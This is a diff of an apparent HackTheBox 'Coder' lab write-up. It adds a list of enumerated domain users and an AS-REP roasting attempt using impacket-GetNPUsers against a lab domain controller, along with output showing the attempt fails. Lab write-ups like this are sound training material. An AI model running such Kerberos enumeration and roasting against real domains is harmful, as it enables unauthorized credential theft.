@@ -239,6 +239,8 @@ $smtpServer = 'smtp.coder.htb'
 
 We can see that we have obtained some users here:
 
+users.txt:
+
 ```
 pkiadmins
 e.black
@@ -246,6 +248,19 @@ itsupport
 ```
 
 Going to attempt AS-REP roasting as a low-hanging fruit.
+
+#### Impacket-GetNPUsers
+
+```
+impacket-GetNPUsers coder.htb/ -dc-ip 10.129.229.10 -no-pass -usersfile users.txt
+Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation
+
+[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)
+[-] User e.black doesn't have UF_DONT_REQUIRE_PREAUTH set
+[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)
+```
+
+The user e.black is a valid user, but does not have Kerberos Pre-Authentication Disabled.
 
 ## Exploitation
 
